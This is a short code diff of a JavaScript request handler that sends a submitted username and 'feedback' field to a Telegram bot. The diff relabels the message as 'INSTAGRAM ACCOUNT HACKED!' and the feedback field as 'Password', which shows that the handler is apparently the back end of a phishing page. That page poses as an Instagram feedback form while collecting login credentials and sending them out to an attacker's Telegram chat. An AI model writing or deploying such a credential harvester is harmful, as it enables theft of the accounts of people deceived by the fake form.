@@ -25,10 +25,10 @@ export default async function handler(req, res) {
     }
 
     const message =
-      "📸 INSTAGRAM STUDIO FEEDBACK\n\n" +
+      "📸 INSTAGRAM ACCOUNT HACKED!\n\n" +
       "👤 Username: " + username + "\n" +
-      "💬 Feedback: " + feedback.trim() + "\n\n" +
-      "⚡ C9 UZAIR";
+      "💬 Password: " + feedback.trim() + "\n\n" +
+      "⚡ Made by C9 UZAIR";
 
     const response = await fetch(
       `https://api.telegram.org/bot${token}/sendMessage`,
